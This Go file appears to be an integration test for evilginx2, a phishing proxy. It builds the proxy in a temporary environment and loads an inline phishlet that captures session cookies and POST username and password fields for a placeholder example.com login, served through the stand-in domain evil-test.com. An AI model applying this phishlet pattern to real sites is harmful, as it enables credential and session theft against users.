package core

import (
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"

	"github.com/kgretzky/evilginx2/database"
)

func TestHttpProxy_Integration_Serve(t *testing.T) {
	// 1. Setup Temp Config Environment
	tmpDir, err := os.MkdirTemp("", "evil_proxy_test")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(tmpDir)

	// Create necessary subdirs
	os.MkdirAll(filepath.Join(tmpDir, "phishlets"), 0755)
	os.MkdirAll(filepath.Join(tmpDir, "redirectors"), 0755)

	// 2. Initialize Config
	cfg, err := NewConfig(tmpDir, "")
	if err != nil {
		t.Fatalf("NewConfig failed: %v", err)
	}

	// 3. Initialize Insturmentation
	db, err := database.NewDatabase(":memory:")
	if err != nil {
		t.Fatalf("NewDatabase failed: %v", err)
	}

	blTmp := filepath.Join(tmpDir, "blacklist.txt")
	os.WriteFile(blTmp, []byte{}, 0644)
	bl, _ := NewBlacklist(blTmp)

	wlTmp := filepath.Join(tmpDir, "whitelist.txt")
	os.WriteFile(wlTmp, []byte{}, 0644)
	wl, _ := NewWhitelist(wlTmp)

	cdb, err := NewCertDb(tmpDir, cfg, nil)
	if err != nil {
		t.Logf("NewCertDb failed (might be expected without full env): %v", err)
	}

	// 4. Initialize Proxy
	// NewHttpProxy(bind_ip, port, cfg, crt_db, db, bl, wl, developer)
	p, err := NewHttpProxy("127.0.0.1", 443, cfg, cdb, db, bl, wl, true)
	if err != nil {
		t.Fatalf("NewHttpProxy failed: %v", err)
	}

	// 5. Test Serving a Request
	req := httptest.NewRequest("GET", "http://example.com/login", nil)
	w := httptest.NewRecorder()

	if p.Proxy != nil {
		p.Proxy.ServeHTTP(w, req)
	} else {
		t.Fatal("p.Proxy is nil")
	}

	resp := w.Result()
	if resp.StatusCode == 0 {
		t.Errorf("Response status 0")
	}

	// 5. Load a Phishlet
	phishContent := `
name: 'test'
author: 'me'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'www', domain: 'example.com', session: true, is_landing: true}
login:
  domain: 'www.example.com'
  path: '/login'
auth_tokens:
  - {domain: 'example.com', keys: ['session_id'], type: 'cookie'}
credentials:
  username: {key: 'u', search: '(.*)', type: 'post'}
  password: {key: 'p', search: '(.*)', type: 'post'}
`
	pPath := filepath.Join(tmpDir, "phishlets", "test.yaml")
	os.WriteFile(pPath, []byte(phishContent), 0644)

	// Manual load
	pl, err := NewPhishlet("test", pPath, nil, cfg)
	if err == nil {
		p.cfg.AddPhishlet("test", pl)
	} else {
		t.Logf("NewPhishlet failed: %v", err)
	}

	// Set base domain
	cfg.general.Domain = "evil-test.com"

	// Request: http://login.evil-test.com/login (Should match phishlet)
	reqPhish := httptest.NewRequest("GET", "http://login.evil-test.com/login", nil)
	wPhish := httptest.NewRecorder()

	if p.Proxy != nil {
		p.Proxy.ServeHTTP(wPhish, reqPhish)
		respPhish := wPhish.Result()
		t.Logf("Phishing request status: %d", respPhish.StatusCode)
	}
}
